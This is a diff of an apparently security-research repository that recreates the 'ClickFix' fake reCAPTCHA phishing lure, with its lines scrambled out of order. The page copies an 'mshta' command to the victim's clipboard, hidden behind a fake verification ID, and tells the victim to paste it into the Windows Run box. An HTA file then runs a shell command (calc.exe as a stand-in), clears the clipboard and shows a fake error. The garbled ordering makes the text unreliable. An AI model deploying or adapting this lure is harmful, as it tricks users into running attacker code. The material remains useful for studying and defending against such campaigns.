@@ -1,0 +1,424 @@
+    
+        
+            
+                   
+                        
+                            Press 
+                            Press <b>Enter</b> on your keyboard to finish.
+                        </li>
+                        <br>
+                        <li>
+                        You will observe and agree:
+                        closeverifywindow()
+                    </code>
+                    </ol>
+                    </p>
+                    <code>
+                    <ol>
+                    <p>
+                    Perform the steps above to finish verification.
+                    checkboxBtn.disabled = true
+                    event.preventDefault()
+                    if (!path.includes(verifywindow) 
+                    let path = event.composedPath()
+                    runClickedCheckboxEffects()
+                    }
+                </div>
+                </header>
+                </main>
+                showCaptchaLoading()
+                showVerifyWindow()
+                transform: rotate(0deg)
+                transform: rotate(360deg)
+                })
+               verifywindow.style.left =  checkboxWindow.offsetLeft - 8  
+            0% {
+            100% {
+            </div>
+            </footer>
+            </p>
+            <br>
+            align-items: center
+            animation: spin 1s linear infinite
+            background-color: 
+            border-radius: 2px
+            border-radius: 3px
+            border-radius: 50%
+            border-top: 1px solid 
+            border-top: 2px solid 
+            border: 1px solid 
+            border: 2px solid 
+            border: none
+            bottom: 36px
+            bottom: 3px
+            bottom: 40px
+            box-sizing: border-box
+            checkboxBtn.disabled = false
+            color: 
+            color: gray
+            color: red
+            const htaPath = window.location.origin 
+            const max = 9999
+            const min = 1000
+            const textToCopy = commandToRun 
+            counter-increment: item
+            counter-reset: item
+            cursor: not-allowed
+            display: block
+            display: flex
+            display: grid
+            document.body.append(tempTextArea)
+            document.body.removeChild(tempTextArea)
+            document.getElementById('verification-id').textContent = verification_id
+            flex-direction: column
+            font-size: 13px
+            font-size: 14px
+            font-size: 15px
+            font-size: 16px
+            font-size: 24px
+            font-size: 8px
+            font-size: 9px
+            font-size: small
+            font-weight: 600
+            font-weight: 700
+            font-weight: bold
+            grid-template-columns: auto 102px
+            height: 100%
+            height: 20px
+            height: 28px
+            height: 45px
+            height: 74px
+            height: min-content
+            hideCaptchaCheckbox()
+            hideCaptchaLoading()
+            if (checkboxBtn) {
+            if (verifywindow.offsetLeft 
+            if (verifywindow.offsetTop < 5) {
+            justify-content: center
+            left: 112px
+            left: 12px
+            left: 244px
+            left: 52px
+            line-height: normal
+            list-style-position: outside
+            list-style-type: none
+            margin-bottom: 10px
+            margin-bottom: 20px
+            margin-left: 10px
+            margin-left: 2px
+            margin-right: 10px
+            margin: 0
+            margin: 21px 0 0 12px
+            margin: auto
+            opacity: 0
+            outline: none
+            padding-bottom: 4px
+            padding-left: 0
+            padding: 0
+            padding: 10px 7px 10px 7px
+            padding: 12px 0 12px 0
+            padding: 16px 16px 24px 16px
+            padding: 20px
+            padding: 5px
+            padding: 8px
+            position: absolute
+            position: relative
+            return Math.floor(Math.random() 
+            setClipboardCopyData(textToCopy)
+            setTimeout(function() {
+            setTimeout(function(){
+            showCaptchaCheckbox()
+            tempTextArea.select()
+            tempTextArea.value = textToCopy
+            text-align: center
+            text-decoration: none
+            text-decoration: underline
+            text-transform: uppercase
+            top: -85px
+            transition: opacity 0.5s linear
+            transition: opacity 400ms
+            var verification_id = generateRandomNumber()
+            verifywindow.style.left =  checkboxWindow.offsetLeft 
+            verifywindow.style.top = checkboxWindow.offsetTop - 80 
+            vertical-align: baseline
+            visibility: hidden
+            width: 100%
+            width: 200px
+            width: 20px
+            width: 28px
+            width: 300px
+            width: 310px
+            width: 40px
+            }
+        .block {
+        .captcha-logo {
+        .checkbox {
+        .checkbox-container {
+        .checkbox-desc {
+        .checkbox-window a {
+        .checkbox-window a:hover {
+        .checkbox-window {
+        .checkbox:hover {
+        .container {
+        .im-not-a-robot {
+        .line-normal {
+        .m-p {
+        .spinner {
+        .terms a {
+        .terms a:hover {
+        .terms {
+        .verify-container {
+        .verify-footer {
+        .verify-footer-left {
+        .verify-header {
+        .verify-header-text-big {
+        .verify-header-text-medium {
+        .verify-header-text-small {
+        .verify-main {
+        .verify-verify-button {
+        .verify-window {
+        </div>
+        </div>        
+        </script>
+        </style>
+        <p><b>Failed to connect with the reCAPTCHA server.</b><br>Try the verification steps again.</p>
+        <style>
+        <title>reCAPTCHA Verification</title>
+        @keyframes spin {
+        Call HideConnectingShowError
+        ClearClipboard
+        Dim objHTML
+        Set objHTML = Nothing
+        addCaptchaListeners()
+        body {
+        code {
+        function addCaptchaListeners() {
+        function closeverifywindow() {
+        function hideCaptchaCheckbox() {
+        function hideCaptchaLoading() {
+        function isverifywindowVisible() {
+        function runClickedCheckboxEffects() {
+        function setClipboardCopyData(textToCopy){
+        function showCaptchaCheckbox() {
+        function showCaptchaLoading() {
+        function showVerifyWindow() {
+        img {
+        ol li {
+        ol li::before {
+        ol {
+        }
+       function generateRandomNumber() {
+    />
+    </body>
+    </div>
+    </head>
+    </p>
+    </script>
+    </style>
+    <HTA:APPLICATION
+    <body>
+    <head>
+    <script>
+    <style>
+    <title>reCAPTCHA Verification</title>
+    End Sub
+    Sub ClearClipboard
+    Sub HideConnectingShowError
+    Sub Window_onLoad
+ (max - min 
+ 1) 
+ 54 
+ <b>R</b>.
+ <b>V</b>.
+ Clears the clipboard so the payload command is removed.
+ Other Musings
+ Perhaps this could be transformed into an easy Github Pages or Vercel tidbit to readily have a public domain and easy tooling
+ Perhaps this could be used within an 
+ Recreation
+ The Lure In The Wild
+ end
+ htaPath
+ isverifywindowVisible()) {
+ min).toString()
+ ploy 
+ reCAPTCHA Phish
+ suffix 
+ that the web browser has premptively copied into their clipboard.
+ verification_id 
+ verifywindow.offsetWidth > window.innerWidth-10 ) {
+![Fail to connect](https://github.com/user-attachments/assets/b3e062a5-eb2a-4c43-9b6f-411625e7f740)
+![New Steps](https://github.com/user-attachments/assets/2fac92b1-fdff-4a67-883b-b8c1b8ae4aa7)
+![Verification Steps](https://github.com/user-attachments/assets/77e9adcb-672e-4a45-845d-58a90ba22935)
+![Verify You Are Human](https://github.com/user-attachments/assets/56be51b9-e58d-40e9-bdb1-54bcc11d4180)
+![reCAPTCHA](https://github.com/user-attachments/assets/3967e15b-0717-4db4-afa1-62394e47f3b2)
+"                            In the verification window, press <b>Ctrl</b> "
+"                        To better prove you are not a robot, please:"
+"                    <span class=""verify-header-text-big m-p block"">Verification Steps</span>"
+"                    <span class=""verify-header-text-medium m-p block""></span>"
+"                    <span class=""verify-header-text-medium m-p block"">Complete these</span>"
+"                <button type=""button"" class=""verify-verify-button block"" id=""verify-verify-button"" disabled=""true"">Verify</button>"
+"                <button type=""button"" id=""checkbox"" class=""checkbox m-p line-normal""></button>"
+"                <div class=""verify-footer-left"">"
+"                <header class=""verify-header"">"
+"                <main class=""verify-main"">"
+"                checkboxBtn.addEventListener(""click"", function (event) {"
+"                checkboxBtnSpinner.style.visibility = ""hidden"""
+"                document.addEventListener(""click"", function (event) {"
+"               verifywindow.style.top = ""5px"""
+"            -webkit-box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12)"
+"            <a href=""https://www.google.com/intl/en/policies/privacy/"">Privacy</a> - <a href=""https://www.google.com/intl/en/policies/terms/"">Terms</a>"
+"            <div class=""checkbox-container m-p"">"
+"            <div class=""verify-container"">"
+"            <footer class=""verify-container verify-footer"">"
+"            <img class=""spinner"" alt="""" id=""spinner"">"
+"            <img src=""https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"" class=""captcha-logo line-normal"" alt="""">"
+"            <p class=""checkbox-desc m-p line-normal"">"
+"            <p class=""im-not-a-robot m-p line-normal"">I'm not a robot</p>"
+"            border: 2px solid rgba(0, 0, 0, 0.1)"
+"            box-shadow: 5px 6px 7px -3px rgba(0, 0, 0, 0.12)"
+"            checkboxBtn.style.borderRadius = ""2px"""
+"            checkboxBtn.style.borderRadius = ""50%"""
+"            checkboxBtn.style.height = ""100%"""
+"            checkboxBtn.style.height = ""4px"""
+"            checkboxBtn.style.margin = ""21px 0 0 12px"""
+"            checkboxBtn.style.marginLeft = ""25px"""
+"            checkboxBtn.style.marginTop = ""33px"""
+"            checkboxBtn.style.opacity = ""0"""
+"            checkboxBtn.style.opacity = ""1"""
+"            checkboxBtn.style.visibility = ""hidden"""
+"            checkboxBtn.style.width = ""100%"""
+"            checkboxBtn.style.width = ""4px"""
+"            checkboxBtnSpinner.style.animation = ""none"""
+"            checkboxBtnSpinner.style.animation = ""spin 1s linear infinite"""
+"            checkboxBtnSpinner.style.opacity = ""0"""
+"            checkboxBtnSpinner.style.opacity = ""1"""
+"            checkboxBtnSpinner.style.visibility = ""hidden"""
+"            checkboxBtnSpinner.style.visibility = ""visible"""
+"            const commandToRun = ""mshta "" "
+"            const end = ""''"""
+"            const ploy = """
+"            const suffix = "" "
+"            const tempTextArea = document.createElement(""textarea"")"
+"            content: counter(item) "". """
+"            document.execCommand(""copy"")"
+"            font-family: Roboto, helvetica, arial, sans-serif"
+"            return verifywindow.style.display !== ""none"" "
+"            stageClipboard(commandToRun, verification_id)"
+"            transition: width 500ms, height 500ms, border-radius 500ms, margin-top 500ms, margin-left 500ms, opacity 700ms"
+"            verifywindow.style.display = ""block"""
+"            verifywindow.style.display = ""none"""
+"            verifywindow.style.opacity = ""0"""
+"            verifywindow.style.opacity = ""1"""
+"            verifywindow.style.visibility = ""hidden"""
+"            verifywindow.style.visibility = ""visible"""
+"            }, 500)"
+"            },500)"
+"            },900)"
+"        <a href=""https://www.google.com/intl/en/policies/privacy/"">Privacy</a> - "
+"        <a href=""https://www.google.com/intl/en/policies/terms/"">Terms</a>"
+"        <div id=""checkbox-window"" class=""checkbox-window m-p block"">"
+"        <div id=""verify-window"" class=""verify-window"">"
+"        <link rel=""stylesheet"" href=""https://use.fontawesome.com/releases/v5.0.0/css/all.css"">        "
+"        <meta charset=""utf-8"">"
+"        <p>Verifying reCAPTCHA, please wait...</p>"
+"        APPLICATIONNAME=""reCAPTCHA Verification"""
+"        BORDER=""thin"""
+"        BORDERSTYLE=""normal"""
+"        ICON=""https://support.google.com/favicon.ico"""
+"        SCROLL=""no"""
+"        SCROLLFLAT=""yes"""
+"        SHOWINTASKBAR=""yes"""
+"        SINGLEINSTANCE=""yes"""
+"        SYSMENU=""yes"""
+"        Set objHTML = CreateObject(""htmlfile"")"
+"        Set objShell = CreateObject(""WScript.Shell"")"
+"        WINDOWSTATE=""normal"""
+"        Window.MoveTo (Screen.Width - 300) / 2, (Screen.Height - 400) / 2"
+"        Window.ResizeTo 520, 480"
+"        document.getElementById(""connecting"").style.display = ""none"""
+"        document.getElementById(""error"").style.display = ""block"""
+"        function stageClipboard(commandToRun, verification_id){"
+"        let checkboxBtn = document.getElementById(""checkbox"")"
+"        let checkboxBtnSpinner = document.getElementById(""spinner"")"
+"        let checkboxWindow = document.getElementById(""checkbox-window"")"
+"        let verifywindow = document.getElementById(""verify-window"")"
+"        objHTML.parentWindow.clipboardData.setData ""text"", """""
+"        objShell.Run ""calc.exe"", 0, False "
+"        objShell.Run ""timeout /T 1 /nobreak"", 0, True"
+"        objShell.Run ""timeout /T 2 /nobreak"", 0, True"
+"    <div class=""container m-p"">    "
+"    <div id=""connecting"" style=""display:block"
+"    <div id=""error"" style=""display:none"
+"    <img src=""https://www.google.com/recaptcha/about/images/reCAPTCHA-logo@2x.png"" alt=""reCAPTCHA Logo"">"
+"    <p class=""terms"">"
+"    <script language=""VBScript"">"
+" ""/recaptcha-verify"""
+" ""I am not a robot - reCAPTCHA Verification ID: <span id=""verification-id"">146820</span>"""
+" ""px"""
+" ''I am not a robot - reCAPTCHA Verification ID: """
+" Disabled ""Verify"" button to further encourage users to complete the copy-paste steps. "
+" Fleshed out phish with the follow-up windows ""failed to verify"""
+" Looks and feels like ""real"" reCAPTCHA (_image from the official Google site_)"
+" Perhaps this could have a bit more server-side control to check the client's user-agent and do things differently, or adjust the payload appropriately."
+" September 13, 2024"
+" Validation in the Run box to ""hide"" the command ("
+" _""I am not a robot - reCAPTCHA Verification ID: 7624""_)"
+" _(Extra callbacks, anybody"
+" element, or easily embedded as a widget _anywhere_."
+" for an innocent proof of concept of popping open the Windows calculator application. This secondary HTA file would mean it needs to be hosted server-side, or have some other backing infrastructure to offer the payload. "
+" function). This can be used as a standalone file and a run any local command, but to get a bit more flexibility with code execution, this repository includes a sample HTA file "
+" hold the Windows Key <i class=""fab fa-windows""></i> "
+" verifywindow.style.display !== """""
+"""Verify you are human"""
+", and have them paste in a malicious command with "
+", the attack vector being _"
+". It includes the CSS and JavaScript in a single file for ease of use, but might need further customization to change the command that is ran (see the JavaScript at the end of the "
+"... sure, it probably works. "
+"<html lang=""en"">"
+"Also, _EdyUkAYshuNaL PoRpoiSes only!!!11_"
+"Considering the original is meant to emulate a [reCAPTCHA](https://www.google.com/recaptcha/about/) form, I thought this _""tradecraft""_ (if you dare to call it that) could be improved. "
+"Following some chatter on [Twitter](https://x.com/_JohnHammond/status/1834292759320297534), these are apparently called [""ClickFix""](https://x.com/ex_raritas/status/1834399472371016084), or [Emmenhtal](https://x.com/SquiblydooBlog/status/1834292295224475648), used in [LummaStealer](https://malpedia.caad.fkie.fraunhofer.de/details/win.lumma) campaigns observed by [Unit42](https://x.com/Unit42_Intel/status/1829178013423992948), [Orange Cyberdefense](https://www.orangecyberdefense.com/global/blog/cert-news/emmenhtal-a-little-known-loader-distributing-commodity-infostealers-worldwide), [Huntress](https://www.huntress.com/), and others. "
+"For quick local testing, I literally just used "
+"The HTA file also gives you an opportunity for more convincing charade, too, potentially with a window that pops up to ""try and connect to the reCAPTCHA servers"", but state that it fails and prompt the user to do it all over again. "
+----------
+-------------
+------------------------------
+1A73E8
+282727
+555555
+5a89e2
+737373
+<!DOCTYPE html>
+</body>
+</head>
+</html>
+<body>
+<head>
+<html>
+> John Hammond 
+> The code is bad because I am a bad programmer.
+> [!CAUTION]
+Ctrl
+Despite this being... 
+It literally instructs the user to open the Windows Run dialog box with the hotkey 
+Originally seen with the guise 
+Really all you need is 
+So this recreation has some extra perks:
+Some code is reused from https://github.com/75a/fake-captcha
+This is small harness to recreate the social engineering and phishing lure recently seen in the wild around August/September 2024.
+This repository includes some of my code playing with that idea.
+Tonmoy Jitu also wrote a [sweet article](https://denwp.com/anatomy-of-a-lumma-stealer/) covering the original lure. 
+Why not make it look as close to the real reCAPTCHA button as possible
+_dumb_
+b2b2b2
+c1c1c1
+cecece
+copy and paste
+d3d3d3
+error {
+f9f9f9
+iframe
+index.html
+python -m http.server 8000
+recaptcha-verify
+showVerifyWindow
